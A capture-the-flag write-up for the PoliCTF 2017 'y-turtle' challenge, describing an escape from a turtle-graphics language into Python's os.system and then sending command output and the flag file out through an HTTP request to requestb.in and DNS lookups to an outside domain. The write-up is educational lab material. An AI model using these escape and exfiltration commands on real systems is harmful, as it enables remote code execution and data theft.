---
layout: post
ctf: "PoliCTF 2017"
title: "y-turtle"
---

# PoliCTF 2017 - Y-Turle - Grab Bag
>A new cyber-artistic collective had fun experimenting with metaprogramming and domain specific languages. Here thre is a first, broken, implementation of a Turtle graphic engine.
>http://yturtle.chall.polictf.it

This challenge was about breaking out of an environnement that provided a DSL to create an image output using turtle graphics.


<img src="https://i.imgur.com/T4VCWjv.png" />

Since the description hinted about metaprogramming, I tried executing function that would be associated to common dynamic languages.

```
(instance_eval "move(5)") ; returned nothing, it's not Ruby
```

```
(move (chr "A")); made the cursor move 41 pixels. chr is very Pythonic function
```

```
(import time)
(time.sleep 10) ; delays the response by 10 seconds
```

Can we use `os.system`? Of course!

```
(import os)
(os.system "sleep 10") ; delays the response by 10 seconds
```

Since I was not able to get the output of the commands I was running, I tried using an external server.

```
(import os)
(os.system "curl http://requestb.in/XXXXXX?x=$(ls|base64)") ; response hangs
```

Access to internet is probably blocked. I then tried using DNS which turned out not to be blocked.

```
(import os)
(os.system "host $(cat flag*|base64).example.com")
```
The server receives a DNS query for the subdomain `ZmxhZ3tzaGFfbWFfbmFfbmFfbmFfc2hhbWFfbmFfbmFfbmFfbmF9Cg==` which decodes to the flag `flag{sha_ma_na_na_na_shama_na_na_na_na}`.

Becojo - Northern Coalition
